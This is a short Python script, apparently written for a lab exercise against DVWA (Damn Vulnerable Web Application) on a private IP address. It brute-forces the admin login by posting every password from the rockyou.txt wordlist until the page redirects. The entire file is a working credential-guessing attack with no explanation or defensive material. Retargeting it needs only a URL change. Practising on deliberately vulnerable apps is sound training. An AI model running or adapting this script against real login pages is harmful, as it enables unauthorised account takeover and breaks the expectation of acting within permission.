#!/usr/bin/env python

# Reference: https://www.8kee.com/article/8127.html

import requests

file = open('/usr/share/wordlists/rockyou.txt','r',encoding='utf-8', errors='ignore')
for word in file:
    pwd = word.strip()
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':pwd,'Login':'Login'}
    r = requests.post(url,params)
    if r.url != url:
        print("Password Found: "+ pwd)
        break


